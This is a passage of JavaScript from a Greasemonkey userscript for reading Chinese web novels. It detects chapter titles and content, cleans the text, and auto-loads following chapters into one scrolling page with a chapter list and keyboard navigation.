                    this.bookTitle + ' - ' + this.chapterTitle :
                    docTitle;

            debug("  Book Title: " + this.bookTitle);
            debug("  Chapter Title: " + this.chapterTitle);
            debug("  Document Title: " + this.docTitle);
        },
        // 智能获取章节标题
        autoGetChapterTitle: function (document) {
            debug("AutoGetTitle start");

            var
                _main_selector = "h1, h2, h3",
                _second_selector = "#TextTitle, #title, .ChapterName, div.h1",
                _positive_regexp = /第?\S+[章节卷回]|\d{2,4}/,
                _negative_regexp = /[上下]一章/,
                _title_remove_regexp = /最新章节|书书网/,
                $doc = $(document),
                _document_title = document.title ? document.title : $doc.find("title").text(),
                _search_document_title = ' ' + _document_title.replace(/\s+/gi, ' ') + ' '
            ;

            var _headings = $doc.find(_main_selector);
            // 加上 second selector 并去除包含的
            $doc.find(_second_selector).each(function(){
                if($(this).find(_main_selector).length == 0){
                    _headings.push(this);
                }
            });

            var possibleTitles = {},
                _heading_text;

            $(_headings).each(function(){
                var _heading = this,
                    _heading_text = _heading.textContent.trim();

                if (_heading_text in possibleTitles) {
                    return;
                }

                debug("  开始计算", _heading_text, "的得分");

                // h1 为 1， h2 为 2
                var
                    nodeNum = parseInt(_heading.nodeName.slice(1), 10) || 10,
                    score = 10 / nodeNum,
                    _heading_words = _heading_text.replace(/\s+/g, " ").split(" "),
                    _matched_words = ""
                ;

                debug("  初始得分:" + score);

                if (_positive_regexp.test(_heading_text)) {
                    score += 50;
                }
                if(_negative_regexp.test(_heading_text)){
                    score -= 100;
                }

                debug("  符合正则计算后得分：", score);

                //  count words present in title
                for (var j = 0, _j = _heading_words.length; j < _j; j++) {
                    if (_search_document_title.indexOf(_heading_words[j]) > -1) {
                        _matched_words += _heading_words[j] + ' ';
                    }
                }
                score += _matched_words.length * 1.5;

                // 跳过长度太小的
                // if (_matched_words.length < 5) {
                    // return;
                // }

                debug("  跟页面标题比较后得分：", score);

                var _font_size_text = "",
                    _font_size_add_score = 0,
                    _heading_style = window.getComputedStyle(_heading, null);
                if(_heading_style){
                    _font_size_text = _heading_style.getPropertyValue("font-size") || 0;
                    _font_size_add_score = parseInt(_font_size_text, 10) * 1.5;
                }

                score +=  _font_size_add_score;

                debug("  计算大小后得分", score);

                possibleTitles[_heading_text] = score;
            });

            // 找到分数最高的值
            var topScoreTitle,
                score_tmp = 0;
            for (_heading_text in possibleTitles) {
                if (possibleTitles[_heading_text] > score_tmp) {
                    topScoreTitle = _heading_text;
                    score_tmp = possibleTitles[_heading_text];
                }
            }

            var curTitle = topScoreTitle;
            if (!curTitle) {
                curTitle = _document_title;

                // 下面的正则从
                //     Firefox-Firefox浏览器论坛-卡饭论坛 - 互助分享 - 大气谦和!
                // 变为
                //     Firefox-Firefox浏览器论坛-卡饭论坛
                curTitle = curTitle.replace(/\s-\s.*/i, "")
                    .replace(/_[^\[\]【】]+$/, "");
                curTitle = curTitle.trim();
                curTitle = curTitle.replace(_title_remove_regexp, '');
            }

            curTitle = curTitle.replace(rule.titleReplace, "");

            return curTitle;
        },
        checkContent: function() {
            var $content;

            var $ajaxScript = this.$doc.find('.' + READER_AJAX);
            if ($ajaxScript.length > 0) {
                return true;
            }

            if(this.info.contentSelector){
                $content = this.$doc.find(this.info.contentSelector);
            }else{  // 按照顺序选取
                var selectors = rule.contentSelectors;
                for(var i = 0, l = selectors.length; i < l; i++){
                    $content = this.$doc.find(selectors[i]);
                    if($content.length > 0){
                        debug("  自动查找内容选择器: " + selectors[i]);
                        break;
                    }
                }
            }

            this.$content = $content[0] ? $content : null;

            return this.$content;
        },
        getContent: function(callback){
            if(callback === undefined){
                callback = function() {};
            }

            if (!this.$content) {
                this.$content = this.checkContent();
            }

            if (!this.$content) return;

            // 特殊处理，例如起点
            var self = this;
            var ajaxScript = this.$doc.find('.' + READER_AJAX);
            if(ajaxScript.length > 0){
                var url = ajaxScript.attr('src');
                if(!url) return;
                var charset = ajaxScript.attr('charset') || 'utf-8';
                debug('  内容特殊处理 Ajax: ', url, ". charset=" + charset);

                GM_xmlhttpRequest({
                    url: url,
                    method: "GET",
                    overrideMimeType: "text/html;charset=" + charset,
                    onload: function(res){
                        var text = res.responseText.replace(/document.write(ln)?\('/, "")
                                .replace("');", "")
                                .replace(/[\n\r]/g, '</p><p>');

                        self.content = self.handleContentText(text, self.info);
                        callback(self);
                    }
                });
            }else{
                this.content = this.handleContentText(this.$content.html(), this.info);
                callback(this);
            }
        },
        handleContentText: function(text, info){
            if(!text) return null;

            var contentHandle = info.contentHandle === undefined ? true : info.contentHandle;

            // GM_setClipboard(text);

            // 拼音字、屏蔽字修复
            if(contentHandle){
                // 先提取出 img
                var imgs = {};
                var i = 0;
                text = text.replace(/<img[^>]*>/g, function(img){
                    imgs[i] = img;
                    return "{" + (i++) + "}";
                });

                text = contentReplacements(text);

                // 还原图片
                text = nano(text, imgs);
            }

            /* Turn all double br's into p's */
            text = text.replace(rule.replaceBrs, '</p>\n<p>');
            text = text.replace(/<\/p><p>/g, "</p>\n<p>");

            // info.contentReplace
            var contentReplace = info.contentReplace;
            if (contentReplace) {
                var replaceText = function(rep){
                    switch(true) {
                        case _.isRegExp(rep):
                            text = text.replace(rep, '');
                            break;
                        case _.isString(rep):
                            var regexp = new RegExp(rep, 'ig');
                            text = text.replace(regexp, '');
                            break
                        case _.isArray(rep):
                            rep.forEach(function(r){ replaceText(r) });
                            break;
                        case _.isObject(rep):
                            var key;
                            for(key in rep){
                                text = text.replace(new RegExp(key, "ig"), rep[key]);
                            }
                            break;
                    }
                };

                replaceText(contentReplace);
            }

            if(info){
                // 去除内容中包含的标题
                var titleRegText = "";
                if(this.bookTitle){
                    titleRegText += this.bookTitle + "\\d+";
                }

                text = text.replace(new RegExp(titleRegText, "g"), "");
                debug("  Content replace title: " + titleRegText);
            }

            text = text.replace(rule.contentReplace, '');

            var $div = $("<div>").html(text);

            if(contentHandle){
               // 给独立的文本添加 <p></p>
               $div.contents().filter(function(){
                   return this.nodeType == 3 && this.textContent.trim().length;
               }).wrap("<p></p>")
               .end()
               .filter('br')
                   .remove();
            }

            // contentRemove
            $div.find(rule.contentRemove).remove();
            if(info.contentRemove){
                $div.find(info.contentRemove).remove();
            }

            $div.find('*').removeAttr('style');

            // 图片居中，所有图像？
            // if(info.fixImage){
            //     $div.find("img").each(function(){
            //         this.className += " blockImage";
            //     });
            // }

            text = $div.html();

            // 修复第一行可能是空的情况
            text = text.replace(/(?:\s|&nbsp;)+<p>/, "<p>");

            // 修复当行就一个字符的
            text = text.replace(/<\/p><p>([。])/, "$1");

            if(config.paragraphBlank){
                text = text.replace(/<p>(?:\s|&nbsp;)+/g, "<p>")
                        .replace(/<p>/g, "<p>　　");
            }

            // 删除空白的、单个字符的 p
            text = text.replace(/<p>[　\s。;]+<\/p>/g, "");

            return text;
        },
        getNextUrl: function(){
            var url, link,
                selector = this.info.nextSelector || rule.nextSelector;

            if (this.info.nextUrl && _.isFunction(this.info.nextUrl)) {
                url = this.info.nextUrl(this.$doc);
                url = this.checkLinks(url);
            }

            if (!url) {
                link = this.$doc.find(selector);
                if(link.length > 0){
                    url = this.checkLinks(link);
                    debug("找到下一页链接: " + url);
                }else{
                    debug("无法找到下一页链接.", link);
                }
            }

            this.nextUrl = url;
            this.isTheEnd = !this.checkNextUrl(url);
            if(this.isTheEnd){
                this.theEndColor = config.end_color;
            }

            return url;
        },
        checkNextUrl: function(url){
            if (this.info.checkSection) {
                if (/\/\d+_\d+\.html$/.test(this.curPageUrl)) {
                    this.isSection = true;
                    if(url == this.indexUrl){
                        return false;
                    }else{
                        return true;
                    }
                }
            }

            switch(true){
                case url === '':
                case rule.nextUrlIgnore.test(url):
                case url == this.indexUrl:
                case url == this.prevUrl:
                case url == this.curPageUrl:
                case rule.nextUrlCompare.test(this.prevUrl) && !rule.nextUrlCompare.test(url):
                    return false;
                default:
                    return true;
            }
        },
        getPrevUrl: function(){
            var url, link, selector;

            if (this.info.prevUrl && _.isFunction(this.info.prevUrl)) {
                url = this.info.prevUrl(this.$doc);
                url = this.checkLinks(url);
            }

            if (!url) {
                selector = this.info.prevSelector || rule.prevSelector;

                link = this.$doc.find(selector);
                if(link.length > 0){
                    url = this.checkLinks(link);
                    debug("找到上一页链接: " + url);
                }else{
                    debug("无法找到上一页链接.", link);
                }
            }

            this.prevUrl = url || '';
            return url;
        },
        getIndexUrl: function(){
            var url, link;
            if(this.info.indexSelector){
                link = this.$doc.find(this.info.indexSelector);
            }else{
                var selectors = rule.indexSelectors;
                var _indexLink;
                // 按照顺序选取目录链接
                for(var i = 0, l = selectors.length; i < l; i++){
                    _indexLink = this.$doc.find(selectors[i]);
                    if(_indexLink.length > 0){
                        link = _indexLink;
                        break;
                    }
                }
            }

            if(link && link.length > 0){
                url = this.checkLinks(link);
                debug("找到目录链接: " + url);
            }else{
                debug("无法找到目录链接.");
            }

            this.indexUrl = url;
            return url;
        },
        checkLinks: function(links){
            var self = this;
            if (_.isString(links)) {
                return this.getFullHref(links);
            }

            var url = "";
            links.each(function(){
                url = $(this).attr("href");
                if(!url || url.indexOf("#") === 0 || url.indexOf("javascript:") === 0)
                    return;

                url = self.getFullHref(this);
                return false;
            });

            return url;
        },
        getLinkUrl: function(linkOrUrl) {
            // if (linkOrUrl && )
            return linkOrUrl;
        },
        getFullHref: function(href) {
            if(!href) return '';

            if (!_.isString(href)) {
                href = href.getAttribute('href');
            }

            if (href.indexOf('http://') == 0) {
                return href;
            }

            var a = this.a;
            if (!a) {
                this.a = a = document.createElement('a');
            }
            a.href = href;

            // 检测 host 是否和 当前页的一样
            if (a.host != this.curPageHost) {
                a.host = this.curPageHost;
            }

            return a.href;
        },
    };

    var App = {
        isEnabled: false,
        parsedPages: {},
        pageNum: 1,
        paused: false,
        curPageUrl: location.href,
        requestUrl: null,
        iframe: null,
        remove: [],

        init: function(){
            if(App.isLaunched) return;
            App.isLaunched = true;

            var isAutoLaunch = App.checkIsAutoLaunch();
            if(isAutoLaunch){
                App.site = App.getCurSiteInfo();

                if(App.site.mutationSelector){  // 特殊的启动：等待js把内容生成完成
                   App.addMutationObserve(document, App.launch);
                }else if(App.site.timeout){  // 延迟启动
                    setTimeout(App.launch, App.site.timeout);
                }else{  // NoScript 下 setTimeout 没用
                    App.launch();
                }
            }else{
                UI.addButton();
            }
        },
        getCurSiteInfo: function (){
            var locationHref = location.href;
            var rules;
            try {
                rules = eval(Config.customSiteinfo);
            } catch(e) {
                console.error('载入自定义站点配置错误')
            }

            if (!_.isArray(rules)) {
                rules = [];
            }
            
            rules = rules.concat(rule.specialSite);

            var info = _.find(rules, function(x){ return toRE(x.url).test(locationHref); });
            if(!info){
                info = {};
            }
            debug("找到规则：", info);
            return info;
        },
        checkIsAutoLaunch: function (){
            var locationHref = window.location.href,
                referrer = document.referrer;
            switch(true){
                case L_getValue("booklinkme_disable_once") == 'true':
                    L_removeValue("booklinkme_disable_once");
                    return false;
                // case location.hostname == 'www.fkzww.net' && !document.title.match(/网文快讯/):  // 啃书只自动启用一个地方
                //     return false;
                case Config.booklink_enable && /booklink\.me/.test(referrer):
                    return true;
                case Config.disable_auto_launch:
                    return false;
                case GM_getValue("auto_enable"):
                case config.soduso && /www\.sodu\.so/.test(referrer):
                    return true;
                default:
                    return false;
            }
        },
        addMutationObserve: function(doc, callback){
            var shouldAdd = false;
            var selector = App.site.mutationSelector;
            var target = $(doc).find(selector)[0];
            if (target) {
                var mutationChildCount = App.site.mutationChildCount;
                if(mutationChildCount === undefined){
                    shouldAdd = true;
                } else {
                    if(target.children.length <= mutationChildCount)
                        shouldAdd = true;
                }
            }

            if (shouldAdd) {
                var observer = new MutationObserver(function(mutations){
                    // console.log(mutations)
                    var mutation = mutations[mutations.length - 1];
                    if(mutation.addedNodes.length){
                        observer.disconnect();
                        callback();
                    }
                });
                observer.observe(target, {childList: true});

                debug("添加 MutationObserve 成功：", selector);
            }else{
                callback();
            }
        },
        launch: function(){
            // 只解析一次，防止多次重复解析一个页面
            if(document.body && document.body.getAttribute("name") == "MyNovelReader"){
                return App.toggle();
            }

           if(!App.site){
                App.site = App.getCurSiteInfo();
            }

            var parser = new Parser(App.site, document);
            var hasContent = !!parser.checkContent();
            if (hasContent) {
                document.body.setAttribute("name", "MyNovelReader");
                App.parsedPages[window.location.href.replace(/\/$/, '')] = true;
                parser.getAll(function(parser){
                    App.processPage(parser);
                });
            } else {
                console.error("错误：没有找到下一页的内容");
            }
        },
        processPage: function(parser){
            App.prepDocument();

            App.initDocument(parser);

            // cache vars
            App.$doc = $(document);
            App.$menuBar = App.$doc.find("#menu-bar");
            App.$menu = App.$doc.find("#menu");
            App.$content = App.$doc.find("#mynovelreader-content");
            App.$loading = App.$doc.find("#loading");
            App.$preferencesBtn = App.$doc.find("#preferencesBtn");

            App.$menuHeader = App.$menu.find("#chapter-list");
            App.$chapterList = App.$menu.find("#chapter-list");

            App.indexUrl = parser.indexUrl;
            App.prevUrl = parser.prevUrl;  // 第一个上一页

            // 加入上一章的链接
            if(parser.prevUrl){
                $("<li>")
                    .addClass('chapter')
                    .append(
                        $("<div>")
                            .attr({
                                "real-href": parser.prevUrl,
                                "onclick": "return false;"
                            })
                            .text("上一章")
                    )
                    .prependTo(App.$chapterList);
            }

            App.appendPage(parser, true);

            App.registerControls();
            
            // UI 的初始化
            UI.init();

            App.curFocusElement = $("article:first").get(0);  // 初始化当前关注的 element

            App.requestUrl = parser.nextUrl;
            App.isTheEnd = parser.isTheEnd;

            App.isEnabled = true;
            UI.addButton();

            // 有些图片网站高度随着图片加载而变长
            setTimeout(App.scroll, 1000);

            // 再次移除其它不相关的，起点，纵横中文有时候有问题
            setTimeout(function(){
                $('body > *:not("#container, .readerbtn, #reader_preferences, #uil_blocker,iframe[name=\'mynovelreader-iframe\']")').remove();
            }, 2000);
        },
        prepDocument: function() {
            window.onload = window.onunload = function() {};

            // 破解右键限制
            var doc = document;
            var bd = doc.body;
            bd.onclick = bd.ondblclick = bd.onselectstart = bd.oncopy = bd.onpaste = bd.onkeydown = bd.oncontextmenu = bd.onmousemove = bd.onselectstart = bd.ondragstart = doc.onselectstart = doc.oncopy = doc.onpaste = doc.onkeydown = doc.oncontextmenu = null;
            doc.onclick = doc.ondblclick = doc.onselectstart = doc.oncontextmenu = doc.onmousedown = doc.onkeydown = function() {
                return true;
            };
            with(document.wrappedJSObject || document) {
                onmouseup = null;
                onmousedown = null;
                oncontextmenu = null;
            }
            var arAllElements = document.getElementsByTagName('*');
            for (var i = arAllElements.length - 1; i >= 0; i--) {
                var elmOne = arAllElements[i];
                with(elmOne.wrappedJSObject || elmOne) {
                    onmouseup = null;
                    onmousedown = null;
                }
            }

            // remove body style
            $('link[rel="stylesheet"], style, script').remove();
            $('*').removeAttr('style');
            $('body').removeAttr('bgcolor');
        },
        initDocument: function(parser){
            document.title = parser.docTitle;
            window.name = "MyNovelReader";
            document.body.innerHTML = nano('\
                <div id="container">\
                    <div id="menu-bar" title="点击显示隐藏章节列表"></div>\
                    <div id="menu">\
                        <div id="header" title="打开目录">\
                            <a href="{indexUrl}" target="_blank">{bookTitle}</a>\
                        </div>\
                        <div id="divider"></div>\
                        <ul id="chapter-list" title="左键滚动，中键打开链接（无阅读模式）">\
                        </ul>\
                    </div>\
                    <div id="mynovelreader-content"></div>\
                    <div id="loading" style="display:none"></div>\
                    <div id="preferencesBtn">\
                        <img style="width:16px" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAABwklEQVRIibVVzWrCQBAeQk/bdk+bm0aWDQEPHtwVahdavLU9aw6KAQ+SQ86Sa19Aqu0T9NafSw8ttOgr1CewUB9CBL3Yy26x1qRp0A8GhsnO9yUzmxmAhKjX68cAMAeAufK3C875FQAsAWCp/O3CsqyhFlB+Oti2/cAYewrD8FDHarXahWEYUy1gGMbUdd1z/TwMw0PG2JNt2/ex5IyxR02CEJpIKbuEkJGOrRshZCSl7CKEJjrGGHuIFMjlcs9RZElNcWxGEAQHGONxWnKM8TgIgoPYMkkpL9MKqNx4xNX8LyOEvMeSq5uxMZlz3vN9v+D7foFz3os6V61Wz36QNhqNUyHENaV0CACLTUnFYvF6/WVUbJPIglI6FELctFqtMiT59Ha7TdcFVCxJ6XYs0Gw2T1SJBlsq0ZxSOhBC3Hied/QjSTUoqsn9lSb3o879avI61FXbzTUFACiXy7v70Tqdzj7G+COtwJ+jIpPJvKYl12ZZ1kucwJs+iBD6lFJ2TdOMHB2mab7/a1xXKpW9fD5/6zjO3erCcV33PMnCcRwnfuHEYXVlZrPZQWqiKJRKpe8Bt5Ol73leCQBmADBTfiJ8AebTYCRbI3BUAAAAAElFTkSuQmCC"/>\
                    </div>\
                    <div id="alert" style="display: none;">\
                        <p id="App-notice"></p>\
                    </div>\
                </div>\
            ', parser);
        },
        toggle: function(){
            if(App.isEnabled){  // 退出
                GM_setValue("auto_enable", false);
                L_setValue("booklinkme_disable_once", "true");

                unsafeWindow.location = App.curPageUrl;
            }else{
                GM_setValue("auto_enable", true);
                L_removeValue("booklinkme_disable_once");
                App.isEnabled = true;
                App.launch();
            }
        },
        removeListener: function(){
            debug("移除各种事件监听");
            App.remove.forEach(function(_remove){
                _remove();
            });
        },
        appendPage: function(parser, isFirst){
            var chapter = $("article:last");
            if(chapter.length && parser.isSection) {  // 每次获取的不是一章，而是一节
                var lastText = chapter.find("p:last").remove().text().trim();
                var newPage = parser.content.replace(/<p>\s+/, "<p>" + lastText);

                chapter
                    .find(".chapter-footer-nav").remove()
                    .end()
                    .append(newPage);

                if(!Config.hide_footer_nav){
                    chapter.append(nano(UI.tpl_footer_nav, parser))
                }

            } else {
                chapter = $("<article>")
                    .attr("id", "page-" + App.pageNum)
                    .append(
                        $("<h1>").addClass("title").text(parser.chapterTitle)
                    )
                    .append(parser.content)
                    .appendTo(App.$content);

                if(!Config.hide_footer_nav){
                    chapter.append(nano(UI.tpl_footer_nav, parser))
                }

                // App.fixImageFloats(chapter.get(0));

                // 添加到章节列表
                var chapterItem = $("<li>")
                    .addClass('chapter')
                    .append(
                        $("<div>")
                            .attr({
                                "href": "#page-" + App.pageNum,
                                "real-href": parser.curPageUrl,
                                "onclick": "return false;"
                            })
                            .text(parser.chapterTitle)
                    )
                    .prependTo(App.$chapterList);

                if(isFirst){
                    chapterItem.addClass('active');
                }

                App.pageNum += 1;
                // 更新缓存变量
                App.menuItems = App.$chapterList.find("div");
                App.scrollItems = $("article");
            }
        },
        registerControls: function(){
            // 内容滚动
            var throttled = _.throttle(App.scroll, 100);
            $(unsafeWindow).scroll(throttled);  // 奶牛和 TM 冲突，需要 unsafeWindow

            App.$doc.on("keydown", App.keydown);

            if (Config.dblclickPause) {
                App.$content.on("dblclick", function(){
                    App.pauseHandler();
                });
            }
            
            // 左侧章节列表
            App.$menuHeader.click(function(){
                App.copyCurTitle();
            });

            App.$menuBar.click(function(){
                UI.hideMenuList();
            });

            App.$doc.on("mousedown", "#chapter-list div", function(event){
                switch(event.which){
                    case 1:
                        var href = $(this).attr("href");
                        if (href) {
                            App.scrollToArticle($(href));
                        } else {
                            location.href = $(this).attr("real-href");
                        }
                        break;
                    case 2:  // middle click
                        L_setValue("booklinkme_disable_once", true);
                        App.openUrl($(this).attr("real-href"));
                        break;
                }
            });

            $("#preferencesBtn").click(function(event){
                event.preventDefault();
                UI.preferencesShow();
            });

            GM_registerMenuCommand("小说阅读脚本设置", UI.preferencesShow.bind(UI));
        },
        copyCurTitle: function(){
            var title = $(App.curFocusElement).find(".title").text()
                    .replace(/第?\S+章/, "").trim();
            GM_setClipboard(title, "text");
        },
        keydown: function(event){
            var tarNN = event.target.nodeName;
            if (tarNN != 'BODY' && tarNN != 'HTML') return;
            if(event.metaKey || event.ctrlKey || event.shiftKey || event.altKey) return;

            switch (event.which) {
                case 13: // Enter
                    App.openUrl(App.indexUrl, "主页链接没有找到");
                    App.copyCurTitle();
                    break;
                case 37: // left arrow
                    var scrollTop = $(window).scrollTop();
                    if(scrollTop === 0){
                        location.href = App.prevUrl;
                    } else {
                        var offsetTop = $(App.curFocusElement).offset().top;
                        // 在视野窗口内
                        if( offsetTop > scrollTop && offsetTop < (scrollTop + $(window).height())){
                            App.scrollToArticle(App.curFocusElement.previousSibling || 0);
                        } else {
                            App.scrollToArticle(App.curFocusElement);
                        }
                    }
                    break;
                case 39: // right arrow
                    if(App.getRemain() === 0){
                        location.href = App.lastRequestUrl || App.requestUrl;
                    } else {
                        App.scrollToArticle(App.curFocusElement.nextSibling || App.$doc.height());
                    }
                    break;
                case 192:
                    UI.hideMenuList();
                    break;
                case Config.hideMenuListKeyCode:
                    UI.hideMenuList();
                    break;
                case Config.openPreferencesKeyCode:
                    UI.preferencesShow();
                    break;
                default:
                    if (UI.$prefs && event.which == 27) {
                        UI.hide();
                    }
                    return;
            }

            return false
        },
        scrollToArticle: function(elem){
            var offsetTop;
            if(typeof elem == "number"){
                offsetTop = elem;
            } else {
                offsetTop = $(elem).offset().top - parseInt($(elem).css("margin-top"), 10);
            }

            $("html, body").stop().animate({ scrollTop: offsetTop }, 750, "easeOutExpo");
        },
        openUrl: function(url, errorMsg){
            if (url) {
                GM_openInTab(url);
            } else {
                UI.notice(errorMsg);
            }
        },
        pauseHandler: function(){
            App.paused = !App.paused;
            if(App.paused){
                UI.notice('<b>状态</b>:自动翻页<span style="color:red!important;"><b>暂停</b></span>.');
                App.$loading.html('自动翻页已经<span style="color:red!important;"><b>暂停</b></span>.').show();
            }else{
                UI.notice('<b>状态</b>:自动翻页<span style="color:red!important;"><b>启用</b></span>.');
                App.scroll();
            }
        },
        scroll: function(){
            if (!App.paused && !App.working && App.getRemain() < Config.remain_height) {
                App.doRequest();
            }

            if(App.isTheEnd){
                App.$loading.html("已到达最后一页...").show();
            }

            App.updateCurFocusElement();
        },
        updateCurFocusElement: function() {  // 滚动激活章节列表
            // Get container scroll position
            var fromTop = $(window).scrollTop() + $(window).height() / 2;

            // Get id of current scroll item
            var cur = App.scrollItems.map(function() {
                if ($(this).offset().top < fromTop)
                    return this;
            });
            // Get the id of the current element
            cur = cur[cur.length - 1];
            var id = cur ? cur.id : "";

            if (App.lastId !== id) {
                App.lastId = id;

                var activeItem = App.menuItems.filter("[href=#" + id + "]"),
                    activeTitle = activeItem.text(),
                    activeUrl = activeItem.attr("real-href");

                // Set/remove active class
                App.menuItems.parent().removeClass("active");
                activeItem.parent().addClass("active");

                App.curFocusElement = cur;
                App.activeUrl = activeUrl;
            }
        },
        getRemain: function(){
            var scrollHeight = Math.max(document.documentElement.scrollHeight,
                                        document.body.scrollHeight);
            var remain = scrollHeight - window.innerHeight - window.scrollY;
            return remain;
        },
        doRequest: function(){
            App.working = true;
            var nextUrl = App.requestUrl;
            App.lastRequestUrl = App.requestUrl;

            if(nextUrl && !App.isTheEnd && !(nextUrl in App.parsedPages)){
                App.parsedPages[nextUrl] = true;
                App.curPageUrl = App.requestUrl;
                App.requestUrl = null;

                var useiframe = App.site.useiframe;

                App.$loading
                    .show()
                    .html("")
                    .append($("<img>").attr("src", "data:image/gif;base64,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"))
                    .append("正在载入下一页" + (useiframe ? "(iframe)" : "") + "...");

                if(useiframe){
                    App.iframeRequest(nextUrl);
                }else{
                    App.httpRequest(nextUrl);
                }
            }else{
                // App.$loading.html("<a href='" + App.curPageUrl  + "'>无法使用阅读模式，请手动点击下一页</a>").show();
            }
        },
        httpRequest: function(nextUrl){
            debug("GM_xmlhttpRequest: " + nextUrl);
            GM_xmlhttpRequest({
                url: nextUrl,
                method: "GET",
                overrideMimeType: "text/html;charset=" + document.characterSet,
                onload: function(res){
                    var doc = createDocumentByString(res.responseText);
                    App.loaded(doc);
                }
            });
        },
        iframeRequest: function(nextUrl){
            debug("iframeRequest: " + nextUrl);
            if (!App.iframe) {
                var i = document.createElement('iframe');
                App.iframe = i;
                i.name = 'mynovelreader-iframe';
                i.width = '100%';
                i.height = '0';
                i.frameBorder = "0";
                i.style.cssText = '\
                    margin:0!important;\
                    padding:0!important;\
                    visibility:hidden!important;\
                ';
                i.src = nextUrl;
                i.addEventListener('load', App.iframeLoaded, false);
                App.remove.push(function() {
                    i.removeEventListener('load', App.iframeLoaded, false);
                });
                document.body.appendChild(i);
            } else {
                App.iframe.contentDocument.location.replace(nextUrl);
            }
        },
        iframeLoaded: function(){
            var iframe = this;
            var body = iframe.contentDocument.body;

            if(body && body.firstChild){
                doc = iframe.contentDocument;

                var mutationSelector = App.site.mutationSelector;
                if(mutationSelector){
                    App.addMutationObserve(doc, function(){
                        App.loaded(doc);
                    });
                }else{
                    var timeout = App.site.timeout || 0;

                    setTimeout(function(){
                        App.loaded(doc);
                    }, timeout);
                }
            }
        },
        loaded: function(doc){
            var parser = new Parser(App.site, doc, App.curPageUrl);
            parser.getAll(App.addNextPage);
        },
        addNextPage: function(parser){
            if(parser.content){
                App.appendPage(parser);

                if (Config.addToHistory) {
                    document.title = parser.docTitle;
                    unsafeWindow.history.pushState(null, "", parser.curPageUrl);
                }

                App.$loading.hide();
                App.requestUrl = parser.nextUrl;
                App.isTheEnd = parser.isTheEnd;
            }else{
                App.removeListener();

                App.$loading.html("错误：没有找到下一页的内容，使用右键翻到下一页").show();
            }

